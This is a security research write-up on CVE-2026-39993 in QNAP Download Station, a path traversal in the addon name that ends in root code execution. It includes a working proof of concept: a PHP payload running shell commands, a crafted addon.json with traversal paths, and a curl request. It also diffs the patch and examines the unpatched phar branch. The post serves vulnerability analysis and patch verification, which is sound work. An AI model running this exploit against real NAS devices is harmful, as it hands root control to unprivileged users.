---
title: "QNAP Download Station: Any Account to Root Through an Addon Name"
date: 2026-11-17
target: "QNAP Download Station (QTS / QuTS hero app)"
severity: High
fixed: "5.10.2.313 / 5.11.3.322"
fix: "QNAP Download Station update"
fix_url: "https://nvd.nist.gov/vuln/detail/CVE-2026-39993"
identifier: "CVE-2026-39993"
advisory_url: "https://nvd.nist.gov/vuln/detail/CVE-2026-39993"
summary: "A logged in Download Station user with no admin rights can make the root daemon load and run an attacker supplied PHP file. The public record calls it a path traversal that reads files. It is actually a path traversal that ends in a require() of attacker code, so the real impact is code execution as root. This post reconstructs the full chain from the shipped binaries and confirms the fix by diffing a patched build."
---

## Summary

CVE-2026-39993 is a path traversal in QNAP Download Station that ends in remote code execution as root. Any account that can reach the Download Station API, including an ordinary non admin user, can trigger it.

The public description is thin. The CVE text says only that an attacker with a user account can "read the contents of unexpected files or system data", and the vendor advisory adds nothing technical. The one real clue is the CVE title, which names the addon parameter. The CVSS vector tells the fuller story on its own: network reach, low privilege required, high impact to confidentiality, integrity and availability. That is not a file read. That is code execution.

This post recovers the actual bug from the Download Station binaries, shows why it is root code execution rather than a file read, walks the exploit, and then diffs a fixed build to show exactly what the patch changed. It closes with a completeness check on the fix, because the patch leaves one branch untouched and it is worth explaining why that branch is still safe.

This is n-day work. The fix shipped before I looked. I found and analysed the bug independently from the public QPKG packages, with no device in hand and no report filed by me. Credit for the fix belongs to whoever reported it to QNAP.

## Background

Download Station is the QNAP app that downloads torrents, HTTP and FTP links, and feeds. It installs as a QPKG and exposes a web API under the NAS. Three pieces matter here.

`ds.cgi` is a thin web front end. It takes the HTTP request, packs the form fields into a message, and forwards them over a local socket to a daemon. It does not make security decisions of its own.

`dsd` is that daemon. It runs as root. Every API method it serves first resolves the caller session. Some methods additionally require admin rights, and they check for that themselves. There is no single gate in front of all methods, so each method owns its own authorization.

`ds-addon` is a small helper that `dsd` runs for addon work. Download Station addons are little PHP plugins that teach it how to talk to a specific site. The addon logic lives in a PHP program that `ds-addon` hands to the system PHP interpreter, and because `dsd` is root, that PHP runs as root too.

The attacker we care about is a logged in Download Station user with no admin rights. That is a realistic account: an admin can grant a limited user download access, and such a user still has their own home folder and can upload files to shares they are allowed to write.

## The bug

The chain has four links. Each one is small. Together they walk a request from an ordinary user to root code execution.

### Link one: the method is reachable and has no admin check

The daemon keeps a table that maps an API name like `Addon::Verify` to a function. When a request arrives, the daemon hashes the client supplied `api` string, looks it up in the table, and calls whatever function it finds. The lookup is driven entirely by the client. There is no admin check in the dispatch path.

`Addon::Verify` does check that the request carries a valid session, so this is not pre auth. What it does not do is check for admin rights. The sibling method `Addon::Install` does reject non admin callers. `Addon::Verify` does not. So any logged in user reaches it.

It reads three parameters from the request, `addon`, `username` and `password`, and does no validation on the `addon` string beyond "is a non empty string". It then runs the helper:

```
ds-addon -v <addon>
```

with `<addon>` passed straight through, and with the username and password handed over as environment variables.

### Link two: the addon name is a path, and it is not sanitized

Inside the PHP program, the `-v` verb lands in `verify($addon)`, which starts by loading the addon profile:

```php
static public function LoadProfile($addon, $ignore = false) {
    ...
    $profile = "addons/$addon/addon.json";
    ...
    $json = json_decode(file_get_contents($profile), true);
```

`$addon` is the attacker string. It is dropped into a file path with no filtering. A value like `../../../../../../share/CACHEDEV1_DATA/homes/bob/pwn` points `$profile` at a folder the attacker controls, well outside the addon directory. The loader reads and parses an `addon.json` that the attacker wrote.

### Link three: the profile points at a PHP file, and that pointer is also not sanitized

The profile declares which PHP file is the addon body. The loader validates it like this:

```php
if (in_array($key = "addon", $keys)) {
    if (!is_string($json[$key])) { goto FormatError; }
    $file = str_replace("addon.json", $json[$key], $profile);
    if (!is_file($file)) { goto FormatError; }
    $instance->addon = $json[$key];
}
```

The only checks are "it is a string" and "a file exists there". The value itself is never pattern checked. So the attacker can set this field to another traversal path that points at their own PHP file. `$instance->addon` now holds that path.

### Link four: the pointer is require()d as root

When the profile is turned into a live instance, the addon body is pulled in:

```php
private function Verify() {
    if (!$this->required) {
        chdir("addons/$this->domain");
        $this->required = require("$this->addon");
    }
    ...
}
```

`require()` on a PHP file executes it. `$this->addon` is attacker controlled. The chain ends here: the attacker's PHP runs, as root, inside the Download Station daemon. There is no signature check anywhere on this path. Signature verification exists only in the separate install flow, which this never touches.

## Proof of concept

I do not have a QNAP box to run this on, so the walk through is reconstructed from the binaries. The shapes below are what the code requires, not output captured from hardware.

The attacker needs write access to one folder with a predictable absolute path. A user home such as `/share/CACHEDEV1_DATA/homes/bob/` works, and File Station or SMB is enough to put files there.

First, the payload. A plain PHP file whose top level code runs on include:

```php
<?php
// evil.php
file_put_contents("/tmp/pwned", shell_exec("id"));
```

Then the profile that points at it. `addon.json` lists the fields the loader insists on, and sets `addon` to a traversal path back to `evil.php`:

```json
{
  "name": "pwn",
  "addon": "../../../../../../share/CACHEDEV1_DATA/homes/bob/evil.php",
  "class": "Pwn",
  "hosts": ["example.com"],
  "author": "x",
  "domain": "pwn",
  "website": "http://x",
  "version": 100,
  "interface": ["IVerify"],
  "description": { "eng": "x" }
}
```

Place `addon.json` in `/share/CACHEDEV1_DATA/homes/bob/pwn/` and `evil.php` alongside it.

Finally, the request. Log in to Download Station as the limited user to get a session, then call the verify method with an `addon` that traverses to the planted profile folder:

```
curl -s 'https://nas.example/cgi-bin/Qdownload/ds.cgi' \
  -b 'session=<download station session>' \
  --data-urlencode 'api=Addon::Verify' \
  --data-urlencode 'addon=../../../../../../share/CACHEDEV1_DATA/homes/bob/pwn' \
  --data-urlencode 'username=x' \
  --data-urlencode 'password=eA=='
```

The loader reads the attacker `addon.json`, follows its `addon` field to `evil.php`, and `require()`s it as root. On a vulnerable build, `/tmp/pwned` appears, owned by root, holding the output of `id`. On a fixed build the request is rejected before any of this with an "Invalid addon name" error.

The important point about the top level code: it runs the instant `require()` includes the file. The later interface and class checks never need to pass, because by then the attacker code has already run.

## Impact

A Download Station user with no admin rights runs arbitrary code as root on the NAS. That is a full crossing of the user to root boundary, with the usual consequences on a storage appliance: every share, every credential on the box, and persistence.

The precondition is modest. The attacker needs a Download Station account and the ability to drop two files on a share with a known path. Both are ordinary for a limited user. The public "reads files" framing understates it. The require() turns a traversal into code execution.

## The fix

I pulled a fixed Download Station package and extracted the same PHP program to diff it against the vulnerable one. The patch is small and sits exactly where the chain starts. `LoadProfile` now rejects the addon name before building any path:

```php
} else {
    if (preg_match('`[/\\]|\.\./`', $addon)) {
        report(ADDON_PROFILE_FAIL, "Invalid addon name.\n");
    }
    $profile = "addons/$addon/addon.json";
    $build = "addons/$addon/addon.build";
}
```

Any addon name that contains a slash, a backslash, or `../` is refused. With that, the attacker can no longer steer the loader outside the real addon directory, so link two is cut and the rest of the chain cannot start. The patch also tightens an unrelated domain pattern so a bare `..` can no longer slip through it, and it converts a couple of shell calls to argument array form so names cannot be reinterpreted by a shell. Those are good hardening, but the addon name check is the one that closes this bug.

## A note on the phar branch

The new check lives in one branch of `LoadProfile`. There is a second branch, taken when the addon name begins with `phar://`, and the check was not added there:

```php
if (($phar = preg_match("`^phar://`", $addon))) {
    $profile = "$addon/addon.json";   // no name check here
} else {
    if (preg_match('`[/\\]|\.\./`', $addon)) { ... }   // the fix
    $profile = "addons/$addon/addon.json";
}
```

That looks like an incomplete fix, so it is worth checking whether the phar branch gives anything back. It does not, for two reasons.

A direct `require()` of code from inside the phar does not work. The existence check builds a phar qualified path, but `require()` uses the raw value relative to the working directory, and a relative name cannot reach into a phar archive while an absolute phar URL breaks the existence check. The two uses never line up on the same file.

The other way to abuse a phar is deserialization, which fires when a file function touches a phar path and unpacks its metadata. That needs a class with a usable magic method loaded at the time. The addon framework has none. Its classes carry no destructor, no string conversion hook, nothing chainable, only two empty wakeup guards that exist precisely to blunt this. So the phar branch reads only the attacker's own archive and reaches no code execution. The fix is complete in practice even though one branch skips the new check.

That check is the kind of thing worth remembering for the next review. A sanitizer added to one branch of a function is only as good as its placement across every branch that reaches the sink.

## Timeline

- 2026-10-15 - CVE-2026-39993 published
- 2026 - fix shipped in Download Station 5.10.2.313 and 5.11.3.322
- 2026-11-17 - independent analysis from the public QPKG binaries, fix confirmed by patch diff

## Disclosure

This is n-day research. The bug was already fixed and the CVE already public when I looked, and I filed nothing. The original find belongs to whoever reported it to QNAP. The public advisory withheld the mechanism and described the impact as a file read, so the value here is the technical detail it left out: that the traversal ends in a require() and the real impact is code execution as root, plus the patch diff that proves what the fix changed and a check that the one unpatched branch is still safe.
